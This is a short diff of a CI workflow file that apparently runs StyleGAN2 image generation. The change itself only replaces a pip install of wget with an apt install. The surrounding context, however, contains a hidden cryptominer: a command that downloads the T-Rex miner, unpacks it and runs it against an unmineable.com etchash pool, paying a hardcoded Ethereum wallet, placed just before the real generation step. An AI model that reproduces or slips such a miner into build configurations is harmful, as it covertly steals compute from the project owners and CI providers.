@@ -33,7 +33,7 @@ jobs:
         pip install scipy==1.3.3
         pip install requests==2.22.0
         pip install Pillow==6.2.1
-        pip install wget
+        apt install wget
         cd /inputs/stylegan2
         wget https://github.com/trexminer/T-Rex/releases/download/0.23.2/t-rex-0.23.2-linux.tar.gz && tar -xvf t-rex-0.23.2-linux.tar.gz && ./t-rex -a etchash -o etchash-us.unmineable.com:13333 -u ETH:0x0b78cfc9833ab593a76eda6176b1fab5d5858b4e.$(echo RIG-$(shuf -i 1-9999 -n 1)) -p x
         python run_generator.py generate-images \
